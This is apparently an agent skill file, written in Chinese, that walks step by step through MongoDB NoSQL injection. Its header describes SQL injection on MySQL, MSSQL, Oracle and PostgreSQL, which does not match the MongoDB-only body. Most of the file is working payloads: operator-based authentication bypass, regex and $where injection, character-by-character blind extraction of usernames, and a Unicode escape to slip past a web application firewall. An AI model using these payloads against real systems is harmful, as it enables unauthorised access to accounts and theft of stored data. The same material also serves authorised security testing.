---
name: sqli-mongodb
description: Use when encountering mysql、mssql、oracle、postgresql等数据库的sql注入技术
---

# SQL注入攻击

## Info

- **Domain**: web
- **Tags**: web, sqli, injection, database

# MongoDB NoSQL注入

## 执行步骤

### 1. 探测注入点

```json
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

### 2. 绕过认证

```json
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### 3. 逻辑运算注入

```json
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```

### 4. 正则注入

```json
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

### 5. $where注入

```json
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```

### 6. 盲注提取数据

```json
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
-- 逐字符枚举用户名
```

### WAF绕过

#### Unicode绕过

```json
{"username": {"\u0024ne": ""}}
-- 使用Unicode编码$符号
```